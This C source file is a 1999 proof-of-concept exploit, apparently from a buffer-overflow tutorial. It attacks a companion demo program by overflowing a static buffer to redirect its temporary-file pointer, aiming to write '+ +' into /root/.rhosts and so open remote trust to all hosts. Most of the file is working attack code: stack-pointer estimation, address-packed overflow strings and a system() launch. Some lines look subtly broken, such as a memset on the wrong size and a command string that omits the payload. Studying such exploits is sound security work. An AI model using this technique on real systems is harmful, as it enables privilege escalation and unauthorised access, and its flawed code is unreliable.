/*
* Copyright (C) January 1999, Matt Conover & WSD
*
* This will exploit vulprog1.c. It passes some arguments to the
* program (that the vulnerable program doesn't use). The vulnerable
* program expects us to enter one line of input to be stored
* temporarily. However, because of a static buffer overflow, we can
* overwrite the temporary filename pointer, to have it point to
* argv[1] (which we could pass as "/root/.rhosts"). Then it will
* write our temporary line to this file. So our overflow string (what
* we pass as our input line) will be:
* + + # (tmpfile addr) - (buf addr) # of A's | argv[1] address
*
* We use "+ +" (all hosts), followed by '#' (comment indicator), to
* prevent our "attack code" from causing problems. Without the
* "#", programs using .rhosts would misinterpret our attack code.
*
* Compile as: gcc -o exploit1 exploit1.c
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#define ERROR -1
#define BUFSIZE 256
#define DIFF 16 /* estimated diff between buf/tmpfile in vulprog */
#define VULPROG "./tempfile"
#define VULFILE "~/haha.c" /* the file 'buf' will be stored in */
/* get value of sp off the stack (used to calculate argv[1] address) */
	u_long getesp()
{
	__asm__("movl %esp,%eax"); /* equiv. of 'return esp;' in C */
}
int main(int argc, char **argv)
{
	u_long addr;
	register int i;
	int mainbufsize;
	char *mainbuf, buf[BUFSIZE] ;
/* ------------------------------------------------------ */
	if (argc <= 1)
{
	fprintf(stderr, "Usage: %s <offset> [try 310-330]\n", argv[0]);
	exit(ERROR);
}
/* ------------------------------------------------------ */
	memset(buf, 0, sizeof(buf));//initial buff
	memset(buf, 'A', DIFF);
	
	addr = getesp() + atoi(argv[1]);//get the address of string
	/* reverse byte order (on a little endian system) */
	
	for (i = 0; i < sizeof(u_long); i++)
		buf[DIFF+i] = ((u_long)addr >> (i * 8) & 255);


	mainbufsize = strlen(buf) + strlen(VULPROG) + strlen(VULFILE) + 13;
	
	mainbuf = (char *)malloc(mainbufsize);
	memset(mainbuf, 0, sizeof(mainbufsize));
	
        printf("%s",buf);
	snprintf(mainbuf, mainbufsize - 1,  " %s %s\n",VULPROG,VULFILE);
	
	printf("Overflowing tmpaddr to point to %p, check %s\n\n",addr, addr);
	system(mainbuf);// call the programmer
return 0;
}
